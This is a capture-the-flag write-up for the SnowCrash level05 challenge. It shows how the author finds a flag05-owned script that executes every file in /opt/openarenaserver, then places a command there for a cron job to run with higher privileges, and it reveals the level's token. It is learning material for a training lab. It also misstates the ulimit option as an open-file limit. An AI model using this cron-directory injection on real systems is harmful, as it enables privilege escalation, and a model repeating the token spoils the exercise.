For this one, I have no clue in the home of the user `level05`.

I do a quick check in the system, looking for something to be exploited.

I first ran:

```bash
level05@SnowCrash:~$ find / -user level05 -exec readlink -f {} \; 2>/dev/null
```

But the output of this one is too long, I retry with another user:

```bash
level05@SnowCrash:~$ find / -user flag05 -exec readlink -f {} \; 2>/dev/null
```

The output is the following:

```bash
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

Here we are ! A script to exploit:

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

The script runs for each file in `/opt/openarenaserver/` directory.
It create a subshell, set its open file limit to 5 and execute the file.
And it finish by removing the file.

So let's try to put a simple script in this directory:

```bash
echo 'getflag' > /opt/openarenaserver/getflag
```

Then activate it with:

```bash
level05@SnowCrash:~$ sh /usr/sbin/openarenaserver
```

But the output is the following:

```
+ getflag
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```

So I'm definitely on the good way. But I won't reach the next level that easy.

---

There is something I didn't notice at first glance.

```bash
level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```

The script is owned by `flag05` with the execution rights enabled.

As I have no way to impersonate the `flag05` user, there must be a cron file that runs periodically to execute the `openarenaserver` script.

```bash
echo "getflag > /tmp/hackflag05" > /opt/openarenaserver/getflag
```

Wait a moment and see that the getflag file has been consumed from the /opt/openarenaserver directory.

The flag is now in the /tmp/hackflag05 file:

```
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
